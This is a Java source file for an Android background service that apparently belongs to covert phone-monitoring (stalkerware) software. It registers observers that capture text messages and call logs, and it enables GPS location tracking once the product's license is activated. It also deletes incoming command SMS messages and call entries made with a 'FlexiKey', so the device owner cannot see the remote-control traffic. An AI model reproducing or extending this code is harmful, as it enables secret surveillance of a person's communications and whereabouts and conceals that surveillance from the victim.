package com.vvt.android.syncmanager.service;

//import com.mobilefonex.mobilebackup.control.ActivateDeactivate;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;

import com.fx.dalvik.contacts.ContactsDatabaseManager;
import com.fx.dalvik.location.GpsTracking;
import com.fx.dalvik.mmssms.MmsSmsDatabaseManager;
import com.fx.dalvik.util.FxLog;
import com.vvt.android.syncmanager.Customization;
import com.vvt.android.syncmanager.control.ConfigurationManager;
import com.vvt.android.syncmanager.control.Main;
import com.vvt.dalvik.mbackupd.calllog.CallLogContentObserver;
import com.vvt.dalvik.mbackupd.mmssms.MmsSmsContentObserver;

public final class EventMonitorService extends Service {

//------------------------------------------------------------------------------------------------------------------------
// PRIVATE API
//------------------------------------------------------------------------------------------------------------------------

	private static final String TAG = "EventMonitorService";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	
	private CallLogContentObserver mCallLogContentObserver;
	private MmsSmsContentObserver mMmsSmsContentObserver;
	private GpsTracking mGpsTracking;

	@Override
	public void onStart(Intent intent, int startId) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onStart # ENTER ...");
		}
		
		// Main is no need to be init here, but this line will help when Main's context is null
		Main.startIfNotStarted(getApplicationContext());

		// For deleting SMS command
		enableCaptureSms();
		
		// For deleting FlexiKey call
		enableCaptureCall();
		
		boolean isActivated = Main.getInstance().getLicenseManager().isActivated();
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("onStart # isActivated: %s", isActivated));
		}
	
		// ApplicationState#isCaptureEnabled is not appropriate here
		ConfigurationManager configManager = 
			Main.getInstance().getConfigurationManager();
		
		boolean captureEnabled = configManager.loadCaptureEnabled();
		
		boolean captureGps = isActivated && captureEnabled && 
				configManager.loadCaptureLocationEnabled();
		
		if (captureGps) {
			enableGpsTracking();
		}
		else {
			disableGpsTracking();
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onStart # EXIT ...");
		}
	}
	
	@Override
	public void onDestroy() { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onDestroy # ENTER ...");
		}
		disableCaptureSms();
		disableCaptureCall();
		disableGpsTracking();
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onDestroy # EXIT ...");
		}
	}
	
	@Override
	public IBinder onBind(Intent aIntent) { 
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "onBind # ENTER ...");
		}
		return null;
	}
	
	private void enableCaptureSms() {
		// Look for SMS command before being enabled
		MmsSmsDatabaseManager.deleteSmsCommand(getApplicationContext());
		
		long refId = MmsSmsDatabaseManager.getLatestSmsId(getApplicationContext());
		
		if (mMmsSmsContentObserver == null) {
			mMmsSmsContentObserver = new MmsSmsContentObserver(new Handler());
		}
		mMmsSmsContentObserver.setRefId(refId);
		mMmsSmsContentObserver.register();
		
		if (LOCAL_LOGV) { 
			FxLog.v(TAG, "enableCaptureSms # SMS is enabled");
		}
	}
	
	private void disableCaptureSms() {
		if (mMmsSmsContentObserver != null) {
			mMmsSmsContentObserver.unregister();
			mMmsSmsContentObserver = null;
		}
		if (LOCAL_LOGV) { 
			FxLog.v(TAG, "disableCaptureSms # SMS is disabled");
		}
	}
	
	private void enableCaptureCall() {
		// Look for FK call log before being enabled
		ContactsDatabaseManager.deleteCallWithFlexiKey(getApplicationContext());
		
		long refId = ContactsDatabaseManager.getLatestCallLogId(getApplicationContext());
		
		if (mCallLogContentObserver == null) {
			mCallLogContentObserver = new CallLogContentObserver(new Handler());
		}
		mCallLogContentObserver.setRefId(refId);
		mCallLogContentObserver.register();
		
		if (LOCAL_LOGV) { 
			FxLog.v(TAG, "enableCaptureCall # Call is enabled");
		}
	}
	
	private void disableCaptureCall() {
		if (mCallLogContentObserver != null) {
			mCallLogContentObserver.unregister();
			mCallLogContentObserver = null;
		}
		if (LOCAL_LOGV) { 
			FxLog.v(TAG, "disableCaptureCall # Call is disabled");
		}
	}
	
	private void enableGpsTracking() {
		if (mGpsTracking == null) {
			mGpsTracking = GpsTracking.getInstance(getApplicationContext());
		}
		mGpsTracking.enable();
		
		if (LOCAL_LOGV) { 
			FxLog.v(TAG, "enableGpsTracking # GpsTracking is enabled");
		}
	}
	
	private void disableGpsTracking() {
		if (mGpsTracking != null) {
			mGpsTracking.disable();
			mGpsTracking = null;
		}
		if (LOCAL_LOGV) { 
			FxLog.v(TAG, "disableGpsTracking # GpsTracking is disabled");
		}
	}
}
